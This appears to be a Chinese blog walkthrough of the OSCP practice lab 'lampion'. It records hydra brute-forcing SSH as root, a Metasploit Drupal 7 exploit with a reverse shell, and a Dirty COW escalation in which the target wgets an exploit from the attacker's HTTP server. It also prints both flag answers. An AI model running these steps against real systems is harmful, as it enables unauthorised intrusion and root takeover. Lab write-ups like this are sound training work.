# 原创
：  从WEB到内网&&SSH爆破&&信息收集&&脏牛提权 ---- 打靶经验分享

# 从WEB到内网&amp;&amp;SSH爆破&amp;&amp;信息收集&amp;&amp;脏牛提权 ---- 打靶经验分享

## OSCP靶机-------lampion

今天来打一个OSCP的靶机，难度中等，花了我半天的时间，包含了端口探测，服务探测，ssh爆破，msf反弹shell，脏牛提权等等…靶场难度中等，需要收集两个flag，一个flag低权限shell就可以获取，第二个要提权后才可以获取。总而言之言而总之，重要的还是信息收集。

### 启动环境：

启动VPN：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/30d89f6695774aad8be033b83e9e0956.png"/><br/> 攻击机IP为：192.168.45.243<br/> 启动目标靶机：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0638a13696f24048a93af3d9afb3f453.png"/><br/> 目标靶机IP为：192.168.230.48

### 信息收集

#### 1.端口

nmap扫描端口：<br/> `nmap --min-rate 10000 -p- 192.168.230.48`<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4efe779735ef4c4599f64263b66ac613.png"/><br/> 目标靶机开放了22,80,1898端口。<br/> 端口服务探测：nmap -p22,80,1898 -sV 192.168.230.48<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d48d19003b4545e8985525ddd12545bd.png"/><br/> 1898端口开启了apache服务。

#### 2.端口测试

**2.1** 22端口<br/> 22端口通过前面的扫描，是openssh 6.6.1p1 ubuntu版本，尝试从这里下手。msf中找一下可利用的脚本。<br/> ·`searchsploit OpenSSH 6.6.1p1`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/47620866672540499941758752acc326.png"/><br/> 待定。<br/> 尝试ssh连接一下目标靶机：<br/> ` ssh root@192.168.230.48 -v`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1c274fe986574801829b270ab1f1439b.png"/><br/> 支持密钥和密码登录。就尝试一下弱口令登录。<br/> ·`ssh root@192.168.230.48 -p 22`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/af72828240974fc599367d2f3bce9b0f.png"/><br/> 试了好几个都是错误，走不通换思路。直接用hydra弱口令爆破。字典用msf的。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0687cb6d9e6949c39c969007c613e9c7.png"/>

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.230.48 ssh -s 22

```

等待…<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a45ea38ca1fb49f196b121b3f48c7b36.png"/><br/> 扫完了整本目录，没有命中的弱口令，22端口无法继续。

**2.2** 80端口<br/> 访问http://192.168.230.48:80<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6f3692e340a2490aad0b4b80c87112ff.png"/><br/> 页面没有什么功能，看不出什么名堂。<br/> HTML隐藏信息看一下：<br/> `curl http://192.168.230.48:80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/500ddac32aeb43c781833fb90811d497.png"/><br/> 竟然是HTTP/0.9协议，太老了，curl都不支持。<br/> dirsearch扫一下：<br/> `dirsearch -u http://192.168.230.48:80`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c31deaa75d59462890418d860d404325.png"/><br/> 还是这个HTTP/0.9协议太过于古老，dirsearch也不支持。<br/> f12，查看前端源码也都没有什么信息可以得到。<br/> 80端口放弃。

**2.3** 1898端口<br/> 访问http://192.168.230.48:1898<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8d9f9ab3ce36498f9507033f0381a802.png"/><br/> 弱口令，SQL都登不进去。看一下cms。<br/> `whatweb http://192.168.230.48:1898`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b01ce3137c5647959e8dea20d3dcc165.png"/><br/> cms是Drupal 7。<br/> 信息收集结束。

### 攻击阶段

通过信息收集，收集到了目标靶机的端口，22和80都无法继续渗透下去，只剩1898的CMS Drupal 7可以利用。直接msf里搜一下它的exp。<br/> `search Drupal 7`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d3cd45e8e1774f369d8170d8703045ad.png"/><br/> 选1，因为比较新。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4f2bbbf9c8fa4edd89ef16f11aa8681e.png"/><br/> 使用命令：<br/> `use 1` 选择exp1<br/> `show payloads` 列出payload<br/> `set payload 17` 选择tcp反弹shell的payload17<br/> `show options` 设置<br/> `set lhost 192.168.45.243` 设置lhost<br/> `set rhosts 192.168.230.48` 设置rhost<br/> ` set rport 1898` 设置端口1898<br/> `run` 执行<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8b91718b943a4a83a6524c995adf41eb.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bd1d214ccee14919bc8cf524227e1938.png"/><br/> 成功反弹shell

### 内网渗透

1.现在拿到的shell交互不太友好，用python实现交互<br/> `shell`<br/> `python -c "import pty;pty.spawn('/bin/bash')";`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9c7e9e238f6341dba277bc0215a1b1d6.png"/><br/> 2.寻找并获取flag1<br/> `find / -name local.txt 2&gt;/dev/null`<br/> `cat /home/tiago/local.txt`

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b958a2e719814f88b98cca4e539a1156.png"/><br/> flag1：a6a93a5c4edf310650a2471db4a4f2aa

### 3.内网信息收集

既然已经拿到了shell，接下来就要进行提权，前提还是要进行信息收集。

3.1 检测Linux操作系统的发行版本<br/> `lsb_release -a`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9aafd0bbcae94f738ba0bd2e8f40732e.png"/><br/> 可以看到发行版本为Ubuntu 14.04.5，14的版本可以使用overlayfs提权

3.2 检测Linux操作系统的内核版本<br/> `uname -a`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/77c6b46bfe5c4d97b769ff25a823502c.png"/><br/> 内核版本为4.4.0,有机会进行脏牛提权。

### 提权

信息收集得知内核可以进行脏牛提权，那就试一试。<br/> `searchsploit dirty`

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/8c0caf91e1fc40d38da13c0eaca0fdfd.png"/><br/> 用cpp的稳定一点。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a2cc7e5c368c42358caaf57e4cbc7aab.png"/><br/> 把exp拷贝出来<br/> `cp /usr/share/exploitdb/exploits/linux/local/40847.cpp exp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/df2c862b83ed4f4ebb5cce6dded3f00e.png"/><br/> 查看使用信息<br/> `cat /usr/share/exploitdb/exploits/linux/local/40847.cpp`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ab2a7af2c0c9484984ff9b7f00885f45.png"/><br/> 发现使用方法：./dcow -s和编译方式g++<br/> 开启http服务，让目标主机下载exp<br/> `sudo python3 -m http.server 90`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/07aaf705486144df854135b1eff12a59.png"/><br/> 返回目标shell，输入下列命令：<br/> `cd /tmp` 进入tmp目录<br/> `wget http://192.168.45.243:90/40847.cpp` 从该端口下载exp<br/> `chmod +x 40847.cpp` 给权限<br/> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil` g++编译为dcow<br/> `chmod +x dcow` 给权限<br/> `./dcow -s` 执行<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/840f1cc50ca5423eb48ee483e8ab2a54.png"/><br/> 成功拿下root权限。<br/> 获取flag2：<br/> `cat /root/proof.txt`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ef3684e7feb84a53b6cc8321e9fe695b.png"/><br/> flag2: 27520bb337712f1d8e10be0b4f01cda9<br/> 靶机通关！<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f864034ebed141b780b96999712f2f02.png"/>
